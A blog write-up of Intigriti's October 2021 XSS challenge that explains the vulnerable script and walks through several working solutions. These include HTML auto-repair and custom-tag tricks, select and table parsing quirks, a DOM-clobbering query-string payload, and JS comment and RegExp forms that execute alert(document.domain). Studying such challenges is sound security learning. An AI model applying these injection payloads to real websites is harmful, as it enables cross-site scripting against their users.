---
title: Learning HTML Again from Intigriti's October XSS Challenge
catalog: true
date: 2021-11-14 15:20:49
tags: [Front-end, Security]
categories: [Security]
photos: /img/intigriti-xss-1021/cover-en.png
---

## Introduction

I have introduced Intigriti's XSS challenge many times before, so I won't go into detail this time. If you are interested, you can refer to my previous articles. The focus of this article will be on their [October](https://challenge-1021.intigriti.io/) challenge, which is not difficult. After spending about one or two days to solve it, I didn't touch it anymore. I decided to write this article because after the challenge ended, I saw many unexpected solutions, so I wanted to record them in an article.

<!-- more -->

## About the Challenge

First, let me briefly explain what this challenge is about. The core code is as follows:

``` js
window.addEventListener("DOMContentLoaded", function () {
  e = `)]}'` + new URL(location.href).searchParams.get("xss");
  c = document.getElementById("body").lastElementChild;
  if (c.id === "intigriti") {
    l = c.lastElementChild;
    i = l.innerHTML.trim();
    f = i.substr(i.length - 4);
    e = f + e;
  }
  let s = document.createElement("script");
  s.type = "text/javascript";
  s.appendChild(document.createTextNode(e));
  document.body.appendChild(s);
});
```

First, a string `e` will be thrown into the script tag. As long as `e` becomes a valid JS code and calls `alert(document.domain)`, you win. The default content of `e` is a strange string: `)]}'` plus the value of xss on the query string.

Next is the essence of this question. It will first check whether the id of the lastElementChild of the body is intigriti. If so, it will take the last four characters of the innerHTML of this element and put them in front of `e`. Let's call these four characters last4. Then `e` will be `{last4})]}'{qs}`, and the goal is to make this whole paragraph a valid code.

As for `qs`, there is no problem because it can be controlled by ourselves. The key is the last4.

My initial idea was simple. If the beginning of last4 is `'`, then the front will become a string, and combined with `qs`, it can become a valid code, like this: `'xxx)]}';alert(1)`.

The problem is, how to control last4? This depends on another place where HTML injection can be done in the question.

``` html
<div id="html" class="text"><h1 class="light">
here
</div>
<!-- !!! -->
<div class="a">'"</div>
</body>
<div id="container">
    <span>I</span>
    <span id="extra-flicker">N</span>
    <span>T</span>
    <span>I</span>
    <div id="broken">
        <span id="y">G</span>
    </div>
    <span>R</span>
    <div id="broken">
        <span id="y">I</span>
    </div>
    <span>T</span>
    <span>I</span>
</div>
```

The last part of the question's HTML looks like this, and we can control the value of `here`, so we can inject any HTML into it (but it is useless to directly do XSS because of CSP). Under the current situation, the lastElementChild of the body will be container.

So our first challenge is to find a way to change lastElementChild.

## Automatic Correction of HTML

Although it seems that the situation is irreversible and we cannot change the last element, in fact, we can wrap the entire paragraph in a div tag without a closing tag, like this:

``` html
<div id="html" class="text"><h1 class="light">
<!-- 底下是注入的值 -->
</h1> <!-- 關閉前面的 h1 -->
</div> <!-- 關閉 id=html 的 div -->
<div id=intigriti> <!-- 建立一個沒有關閉標籤的 div -->
<div> <!-- 關閉下面那個 div，沒有這個的話上面的 intigriti 就被關閉了 -->
<!-- 上面是注入的值 -->
</div>
<!-- !!! -->
<div class="a">'"</div>
</body>
<div id="container">
    <span>I</span>
    <span id="extra-flicker">N</span>
    <span>T</span>
    <span>I</span>
    <div id="broken">
        <span id="y">G</span>
    </div>
    <span>R</span>
    <div id="broken">
        <span id="y">I</span>
    </div>
    <span>T</span>
    <span>I</span>
</div>
```

After formatting, it will look like this:

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<div id=intigriti>
  <div></div>
  <!-- !!! -->
  <div class="a">'"</div>
  </body>
  <div id="container">
    <span>I</span>
    <span id="extra-flicker">N</span>
    <span>T</span>
    <span>I</span>
    <div id="broken">
        <span id="y">G</span>
    </div>
    <span>R</span>
    <div id="broken">
        <span id="y">I</span>
    </div>
    <span>T</span>
    <span>I</span>
  </div>
```

The DOM structure is like this:

![](/img/intigriti-1021/p1.png)

You will clearly see that container is wrapped, and it doesn't matter that there is no closing tag, because the browser will automatically repair it for us, it's that magical. However, as it is now, the lastElementChild of intigriti will be `<div id=container>`, and the last four characters of its innerHTML will be `pan>`, which cannot form a valid code, so we need to find a way to control the last four characters.

## Control last4

This is where I got stuck the longest, because I was always stuck on trying to control the "content" and trying to add content, but due to the structure, I couldn't make the added content the last child. But later, I suddenly broke through the blind spot and thought that I didn't need to control the content, just control the tag!

We can wrap it twice again, like this:

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<div id=intigriti>
  <test1>
    <test2>
      <div></div>
      <div class="a">'"</div>
      </body>
      <div id="container">
        <span>I</span>
        <span id="extra-flicker">N</span>
        <span>T</span>
        <span>I</span>
        <div id="broken">
            <span id="y">G</span>
        </div>
        <span>R</span>
        <div id="broken">
            <span id="y">I</span>
        </div>
        <span>T</span>
        <span>I</span>
      </div>
```

The structure will become like this:

![](/img/intigriti-1021/p2.png)

In this way, the last child of intigriti will become test1, its innerHTML will become test2, and the last four characters will become `st2>`. Here, we use the custom tag plus the property that the browser will automatically close to control the last four characters.

So as long as we change `<test2>` to `<tes't2>`, last4 will become `'t2>`, starting with a single quote, achieving our goal. Then set xss to `;alert(document.domain)`, and we're done:

![](/img/intigriti-1021/p3.png)

## Unexpected Solutions

After I solved this question in the way mentioned above, I thought I was done, and I didn't expect there to be other solutions (I was too naive). It wasn't until the official release of other people's writeups that I realized that I was really a frog at the bottom of a well.

---

I wanted to write this post because unexpected solutions can teach us something new. Let's take a look at each of them.

### Utilizing the Special Behavior of HTML Tags

The following technique was learned from [@svennergr](https://gist.github.com/svennergr/53b904a08f42bd7f588bde38a02345f1).

When I was solving this problem, the reason why I finally wrapped it with tags outside was that if I didn't do this, I couldn't control the `lastElementChild` under intigriti, which would become the `container` div.

However, some HTML tag behaviors can break this deadlock. For example, the magical `<select>` tag. We pass in our payload: `</h1></div><div id=intigriti><select>`, and the HTML will be like this:

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<div id=intigriti>
  <select>
    </div>
    <div class="a">'"</div>
    </body>
    <div id="container">
      <span>I</span>
      <span id="extra-flicker">N</span>
      <span>T</span>
      <span>I</span>
      <div id="broken">
          <span id="y">G</span>
      </div>
      <span>R</span>
      <div id="broken">
          <span id="y">I</span>
      </div>
      <span>T</span>
      <span>I</span>
    </div>
```

Guess what it became in the end?

All the tags inside the select disappeared!

![](/img/intigriti-1021/p4.png)

And `lastElementChild` takes an element, not a node, so if we add an option, it will become the only element. Then we replace `<div id=intigriti>` with `<select id=intigriti>`, and it will look like this:

![](/img/intigriti-1021/p5.png)

In this way, we successfully controlled the content of `lastElementChild` and achieved what I thought was impossible!

Another magical element is called `table`. Our code looks like this, and the payload is `</h1></div><table id=intigriti><tbody>`:

``` html
<div id="html" class="text">
  <h1 class="light"></h1>
</div>
<table id=intigriti>
  <tbody>
    </div>
    <div class="a">'"</div>
    </body>
    <div id="container">
      <span>I</span>
      <span id="extra-flicker">N</span>
      <span>T</span>
      <span>I</span>
      <div id="broken">
          <span id="y">G</span>
      </div>
      <span>R</span>
      <div id="broken">
          <span id="y">I</span>
      </div>
      <span>T</span>
      <span>I</span>
    </div>
```

But when it is rendered, the table becomes the last element by itself:

![](/img/intigriti-1021/p6.png)

I actually tried it out, and elements that are inside but not belonging to the table can be used, for example:

``` html
<body>
<table>
    <tr><div>123</div></tr>
    <h1>last</h1>
</body>
```

After being placed on the DOM, it becomes:

``` html
<body>
    <div>123</div>
    <h1>last</h1>
    <table>
        <tbody>
            <tr></tr>
        </tbody>
    </table>
</body>
```

And if we have a comment `<!-- -->` inside the `tr`, it can also be brought into the `tr` (using `td` is also possible). What's even more amazing is that in the intigriti table case, the content is `<!-- !!! -->`, right? So the last four characters are `-->`, which is actually a JS comment.

![](/img/intigriti-1021/p7.png)

In the [July challenge](https://blog.huli.tw/2021/08/06/intigriti-xss-0721/), we learned that `<!--` is a comment, but I didn't expect that `-->` is also a comment. It's really eye-opening.

And the original article also compiled a list, running through each tag to see which ones can appear inside `<select>` and `<table>`. It seems that `<script>`, `<style>`, and `<template>` can all appear inside without being removed.

### DOM Clobbering

This solution comes from [@airispoison](https://twitter.com/airispoison/status/1455451323759988737), which I think is a very creative solution.

His payload is:

``` js
?html=</div><form id=intigriti><button id=lastElementChild>/*</button>&xss=*/alert(document.domain)
```

He was hacking this part:

``` js
c = document.getElementById("body").lastElementChild; // 會拿到 <form id=intigriti>
if (c.id === "intigriti") {
  l = c.lastElementChild; // 這邊拿到的會是 <button id=lastElementChild>，而不是真的 lastElementChild！
  i = l.innerHTML.trim();
  f = i.substr(i.length - 4);
  e = f + e;
}
```

The clever part of this solution is that `lastElementChild` should originally get the `lastElementChild` on the DOM, but because it was clobbered by DOM clobbering, it got the button with the id `lastElementChild`!

In this way, `innerHTML` can be controlled, and any value can be passed in to form legal JS. Speaking of legal JS, let's take a look at which methods can be used to form legal JS.

### Forming Legal JS

Assuming we have a string: `)]}'`, we can add up to four characters in front and any characters at the end. How can we come up with executable JS code?

One of the most intuitive ideas I have is to add a single quote in front, so that it becomes a string, and then add something at the end to execute it, like this:

``` js
')]}';console.log(1)
')]}',console.log(1)
')]}'+console.log(1)
```

---

Remember to strictly follow the rules mentioned earlier.

In addition, adding a newline to a single-line comment or using multi-line comments is also an intuitive idea:

``` js
//)]}'
console.log(1)

/*)]}'*/console.log(1)
```

And from the article, we know that there are some comment styles in JS that you may not know:

``` js
<!--)]}'
console.log(1)

-->)]}'
console.log(1)
```

The related V8 test file is here: [v8/test/mjsunit/html-comments.js](https://github.com/v8/v8/blob/901b67916dc2626158f42af5b5c520ede8752da2/test/mjsunit/html-comments.js)

In addition to the above, you can also use RegExp!

``` js
/()]}'/+console.log(1)
/[)]}'/+console.log(1)
```

## Conclusion

Not only JS, but HTML is also vast and profound, with various magical features. I thought this challenge was easy to pass, but it was just using the solution I already knew to pass. Learning from other people's answers seems to be more important than passing the challenge. In this challenge, I learned:

1. The behavior of the `<select>` and `<table>` tags
2. Using `<!--` and `-->` as comments
3. Using RegExp to construct valid code.
